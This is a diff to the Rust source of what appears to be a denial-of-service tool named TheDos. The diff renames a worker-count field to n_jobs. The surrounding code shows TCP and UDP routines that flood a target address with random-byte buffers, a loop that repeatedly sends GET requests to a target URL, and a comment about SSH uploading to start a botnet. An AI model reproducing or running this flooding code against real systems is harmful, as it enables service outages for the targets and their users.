@@ -36,14 +36,14 @@ pub struct TheDos{
     pub url: Option<String>,
     pub tcp_addr: Option<String>,
     pub udp_addr: Option<String>,
-    pub n_workers: usize,
+    pub n_jobs: usize,
 }
 
 
 impl TheDos{
 
 
-    pub fn new(url: Option<String>, tcp_addr: Option<String>, udp_addr: Option<String>, host: Option<String>, n_workers: usize) -> Self{
+    pub fn new(url: Option<String>, tcp_addr: Option<String>, udp_addr: Option<String>, host: Option<String>, n_jobs: usize) -> Self{
         Self{
             flag: 0,
             safe: 0,
@@ -53,7 +53,7 @@ impl TheDos{
             url,
             tcp_addr,
             udp_addr,
-            n_workers,
+            n_jobs,
         }
     }
 
@@ -89,7 +89,7 @@ impl TheDos{
             url, 
             tcp_addr, 
             udp_addr, 
-            n_workers 
+            n_jobs 
         } = self; // unpacking self into a new struct
         
         // ssh uploading to start botnet
@@ -229,15 +229,15 @@ impl TheDos{
         
         let mut res = self.send_get().await;
 
-        while let Err(e) = res{
+        while let Err(e) = res{ // if anything went wrong with sending the request we must try again until we reach the end of jobs
             
             eprintln!("can't send to {} at {} due to {}", self.url.as_ref().unwrap(), chrono::Local::now(), e);
             println!("retring send get at {}", chrono::Local::now());
-            res = self.send_get().await; // send the get untill all workers get finished
+            res = self.send_get().await; // send the get untill all n_jobs get finished
             
-            if self.retries >= self.n_workers{
-                println!("reached the maximum workers at {}", chrono::Local::now());
-                process::exit(1); // reached the maximum workers
+            if self.retries >= self.n_jobs{
+                println!("reached the maximum n_jobs at {}", chrono::Local::now());
+                process::exit(1); // reached the maximum n_jobs
             }
 
         }
@@ -254,7 +254,7 @@ impl TheDos{
     pub async fn tcpcall(&mut self){
 
         let mut time = self.retries;
-        let workers = self.n_workers; // making a new lifetime for the workers
+        let n_jobs = self.n_jobs; // making a new lifetime for the n_jobs
         let tcp_addr = self.tcp_addr.clone().unwrap(); // if we are here we are sure that we have a tcp address from the passed in cli arg - single ip:port attack
 
         time+=1;
@@ -263,7 +263,7 @@ impl TheDos{
                 Ok(mut stream) => {
 
                     println!("sending packet at {} | retries {}", chrono::Local::now(), time);
-                    let random_bytes: Vec<u8> = (0..workers).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with the number of workers as the byte size, for 4096 workers we'll have 4096 bytes
+                    let random_bytes: Vec<u8> = (0..n_jobs).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with the number of n_jobs as the byte size, for 4096 n_jobs we'll have 4096 bytes
                     stream.write_all(&random_bytes).await.unwrap(); // sending buffer to the target host 
 
                 },
@@ -286,7 +286,7 @@ impl TheDos{
     pub async fn udpcall(&mut self){
             
         let mut time = self.retries;
-        let workers = self.n_workers; // making a new lifetime for the workers
+        let n_jobs = self.n_jobs; // making a new lifetime for the n_jobs
         let udp_addr = self.udp_addr.clone().unwrap(); // if we are here we are sure that we have a udp address from the passed in cli arg
 
         time+=1;
@@ -296,7 +296,7 @@ impl TheDos{
                 Ok(_) => {
 
                     println!("sending packet at {} | retries {}", chrono::Local::now(), time);
-                    let random_bytes: Vec<u8> = (0..workers).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with the number of workers as the byte size, for 4096 workers we'll have 4096 bytes
+                    let random_bytes: Vec<u8> = (0..n_jobs).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with the number of n_jobs as the byte size, for 4096 n_jobs we'll have 4096 bytes
                     socket.send(&random_bytes).await.unwrap(); // send to the remote address that this socket is connected to or we can send to another address 
 
                 },
